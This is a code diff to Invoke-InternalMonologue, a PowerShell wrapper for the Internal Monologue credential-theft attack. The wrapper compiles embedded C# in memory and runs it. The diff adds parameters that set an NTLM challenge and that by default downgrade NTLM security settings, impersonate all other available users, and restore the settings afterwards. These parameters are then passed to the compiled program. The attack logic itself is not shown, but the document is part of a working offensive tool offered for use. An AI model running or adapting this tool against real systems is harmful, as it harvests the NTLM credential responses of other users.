@@ -15,7 +15,45 @@ Invoke-InternalMonologue
 .LINK
 https://github.com/eladshamir/Internal-Monologue
 
+.PARAMETER Challenge
+Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation. Optional. Defult is 1122334455667788.
+
+.PARAMETER Downgrade
+Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true. Use switch to disable Downgrade
+
+.PARAMETER Impersonate
+Specifies whether to try to impersonate all other available users or not [True/False]. Optional. Defult is true. Use switch to disable Impersonate
+
+.PARAMETER Restore
+Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true. Use switch to disable Restore
+
+.PARAMETER Verbose
+Specifies whether print verbose output or not [True/False]. Optional. Defult is false.
+
 #>
+
+[CmdletBinding()]
+Param(
+	[Parameter(Position = 0)]
+	[String]
+	$Challenge,
+	
+	[Switch]
+	$Downgrade,
+	
+	[Switch]
+	$Impersonate,
+	
+	[Switch]
+	$Restore
+)
+
+# Invert flags so that options run by default; Switches are used to disable a feature
+if ($Downgrade){$Downgrade = $False} Else {$Downgrade = $True}
+if ($Impersonate){$Impersonate = $False} Else {$Impersonate = $True}
+if ($Restore){$Restore = $False} Else {$Restore = $True}
+if ($PSBoundParameters['Verbose']){$v = $True} Else {$v = $False}
+if ($Challenge -eq $null -or $Challenge -eq ""){$Challenge = "1122334455667788"}
 
 $Source = @"
 using System;
@@ -837,6 +875,7 @@ $inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Loc
 
 Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem 
 
-[InternalMonologue.Program]::Main($args)
+# Space needed in front of dictionary key name
+[InternalMonologue.Program]::Main(@(" challenge",$Challenge," downgrade",$Downgrade," impersonate",$Impersonate," restore",$Restore," verbose",$v))
 
 }
